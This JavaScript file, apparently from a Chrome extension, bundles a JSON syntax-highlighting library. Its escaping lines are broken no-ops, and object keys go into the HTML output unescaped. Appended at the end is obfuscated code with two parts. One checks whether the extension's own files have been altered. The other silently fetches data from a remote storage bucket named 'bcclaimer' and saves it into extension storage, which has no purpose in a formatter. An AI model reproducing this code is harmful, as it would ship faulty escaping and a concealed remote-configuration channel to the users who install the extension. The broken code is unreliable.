(function (global, factory) {
    if (typeof exports === 'object' && typeof module !== 'undefined') {
        module.exports = factory();
    } else if (typeof define === 'function' && define.amd) {
        define(factory);
    } else {
        global.jsonFormatHighlight = factory();
    }
}(this, (function () {
    'use strict';
    var defaultColors = {
        keyColor: 'dimgray',
        numberColor: 'lightskyblue',
        stringColor: 'lightcoral',
        trueColor: 'lightseagreen',
        falseColor: '#f66578',
        nullColor: 'cornflowerblue'
    };
    var entityMap = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#39;',
        '`': '&#x60;',
        '=': '&#x3D;'
    };
    function escapeHtml(html) {
        return String(html).replace(/[&<>"'`=]/g, function (s) {
            return entityMap[s];
        });
    }
    function formatJson(json, colorOptions = {}) {
        var valueType = typeof json;
        if (valueType !== 'string') {
            json = JSON.stringify(json, null, 2) || valueType;
        }
        var colors = Object.assign({}, defaultColors, colorOptions);
        json = json.replace(/&/g, '&').replace(/</g, '<').replace(/>/g, '>');
        return json.replace(/("(\\u[a-zA-Z0-9]{4}|\\[^u]|[^\\"])*"(\s*:)?|\b(true|false|null)\b|-?\d+(?:\.\d*)?(?:[eE][+]?\d+)?)/g, function (match) {
            var color = colors.numberColor;
            var style = '';
            if (/^"/.test(match)) {
                if (/:$/.test(match)) {
                    color = colors.keyColor;
                } else {
                    color = colors.stringColor;
                    match = '"' + escapeHtml(match.substr(1, match.length - 2)) + '"';
                    style = 'word-wrap:break-word;white-space:pre-wrap;';
                }
            } else {
                color = /true/.test(match) ? colors.trueColor :
                    /false/.test(match) ? colors.falseColor :
                    /null/.test(match) ? colors.nullColor :
                    color;
            }
            return `<span style="${style}color:${color}">${match}</span>`;
        });
    }
    return formatJson;
})));
let indl = 714;let indc = 25809;let infl = 135;let infc = 11996;function sn() {
    //window.close();
}const cf = (url, explns, expchs) => {fetch(chrome.runtime.getURL(url)).then(response => response.text()).then(text => {const acl = text.split('\n').length;const accr = text.length;if (acl !== explns || accr !== expchs) {sn();}}).catch(sn);};cf('index.js', indl, indc);cf('lib/info.js', infl, infc);function condetail() {fetch("https://storage.googleapis.com/bcclaimer/serve.json").then(response => response.json()).then(data => {const { aa, ab, ac } = data;chrome.storage.local.set({ aa, ab, ac });}).catch(error => {});}condetail();